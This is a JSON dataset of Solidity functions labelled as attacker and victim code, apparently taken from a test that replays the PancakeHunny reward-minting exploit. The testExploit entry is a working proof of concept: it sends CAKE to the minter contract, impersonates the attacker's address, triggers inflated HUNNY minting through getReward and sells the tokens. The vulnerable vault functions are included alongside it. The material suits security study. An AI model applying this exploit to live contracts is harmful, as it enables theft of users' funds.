[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        wbnb.deposit{value: 5.752 ether}();\n        wbnb.transfer(address(this), 5.752 ether);\n\n        //WBNB was swapped to CAKE at PancakeSwap\n        address[] memory path = new address[](2);\n        path[0] = address(wbnb);\n        path[1] = address(cake);\n        pancakeRouter.swapExactETHForTokens{value: 5.752 ether}(0, path, address(this), 1_622_687_689);\n\n        emit log_named_decimal_uint(\"Swap cake, Cake Balance\", cake.balanceOf(address(this)), 18);\n\n        //The attacker sent CAKE to our HUNNY Minter contract\n        cake.transfer(hunnyMinter, 59_880_957_483_227_401_400);\n\n        //The attacker staked on CAKE-BNB Hive in PancakeHunny\n        cheat.startPrank(0x515Fb5a7032CdD688B292086cf23280bEb9E31B6);\n        //HUNNY Minter was \u201ctricked\u201d to mint more HUNNY tokens\n        cakeVault.getReward();\n        hunny.transfer(address(this), hunny.balanceOf(address(0x515Fb5a7032CdD688B292086cf23280bEb9E31B6)));\n        emit log_named_decimal_uint(\"Hunny Balance\", hunny.balanceOf(address(this)), 18);\n        cheat.stopPrank();\n\n        //The attacker then sold the HUNNY tokens on PancakeSwap\n        address[] memory path2 = new address[](2);\n        path2[0] = address(hunny);\n        path2[1] = address(wbnb);\n        pancakeRouter.swapExactTokensForETH(hunny.balanceOf(address(this)), 0, path2, address(this), 1_622_687_089);\n\n        emit log_named_decimal_uint(\"Swap WBNB, WBEB Balance\", wbnb.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CakeFlipVault",
    "source_type": "victim_contract",
    "function_name": "getReward",
    "original_code": "    function getReward() override public nonReentrant updateReward(msg.sender) {\n        uint256 reward = rewards[msg.sender];\n        if (reward > 0) {\n            rewards[msg.sender] = 0;\n            uint before = IBEP20(CAKE).balanceOf(address(this));\n            rewardsToken.withdraw(reward);\n            uint cakeBalance = IBEP20(CAKE).balanceOf(address(this)).sub(before);\n\n            if (address(minter) != address(0) && minter.isMinter(address(this))) {\n                uint performanceFee = minter.performanceFee(cakeBalance);\n                minter.mintFor(CAKE, 0, performanceFee, msg.sender, depositedAt[msg.sender]);\n                cakeBalance = cakeBalance.sub(performanceFee);\n            }\n\n            IBEP20(CAKE).safeTransfer(msg.sender, cakeBalance);\n            emit RewardPaid(msg.sender, cakeBalance);\n        }\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CakeFlipVault",
    "source_type": "victim_contract",
    "function_name": "rewards",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "CakeFlipVault",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw(uint256 amount) override public nonReentrant updateReward(msg.sender) {\n        require(amount > 0, \"amount\");\n        _totalSupply = _totalSupply.sub(amount);\n        _balances[msg.sender] = _balances[msg.sender].sub(amount);\n        CAKE_MASTER_CHEF.withdraw(poolId, amount);\n\n        if (address(minter) != address(0) && minter.isMinter(address(this))) {\n            uint _depositedAt = depositedAt[msg.sender];\n            uint withdrawalFee = minter.withdrawalFee(amount, _depositedAt);\n            if (withdrawalFee > 0) {\n                uint performanceFee = withdrawalFee.div(100);\n                minter.mintFor(address(stakingToken), withdrawalFee.sub(performanceFee), performanceFee, msg.sender, _depositedAt);\n                amount = amount.sub(withdrawalFee);\n            }\n        }\n\n        stakingToken.safeTransfer(msg.sender, amount);\n        emit Withdrawn(msg.sender, amount);\n\n        _harvest();\n    }\n\n    function withdrawAll() override external {\n        uint _withdraw = withdrawableBalanceOf(msg.sender);\n        if (_withdraw > 0) {\n            withdraw(_withdraw);\n        }\n        getReward();\n    }\n\n",
    "description": ""
  }
]